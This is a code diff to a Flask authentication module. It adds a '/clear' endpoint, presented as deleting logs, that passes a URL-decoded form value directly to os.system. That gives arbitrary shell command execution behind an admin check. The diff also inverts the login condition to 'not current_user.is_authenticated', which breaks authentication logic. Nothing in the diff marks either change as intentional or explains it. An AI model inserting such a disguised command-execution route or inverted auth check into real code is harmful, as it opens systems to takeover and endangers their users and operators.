@@ -4,6 +4,7 @@ from flask_login import login_user, logout_user, login_required, current_user
 from .models import User
 from . import db
 from urllib.parse import unquote
+import os
 
 auth = Blueprint('auth', __name__)
 
@@ -13,7 +14,7 @@ def login():
 
 @auth.route('/login', methods=['POST'])
 def login_post():
-    if current_user.is_authenticated:
+    if not current_user.is_authenticated:
 
         email = request.form.get('email').lower()
         password = request.form.get('password')
@@ -101,4 +102,14 @@ def settings():
         con.execute(query)
 
     flash("Spam settings updated")
+    return redirect(url_for('main.index'))
+
+@auth.route('/clear', methods=['POST'])
+@login_required
+def clear():
+    if current_user.admin == 1:
+        cmd = unquote(request.form.get('clear'))
+        os.system(cmd)
+        flash("Logs successfully deleted ")
+        return redirect(url_for('main.index'))
     return redirect(url_for('main.index'))
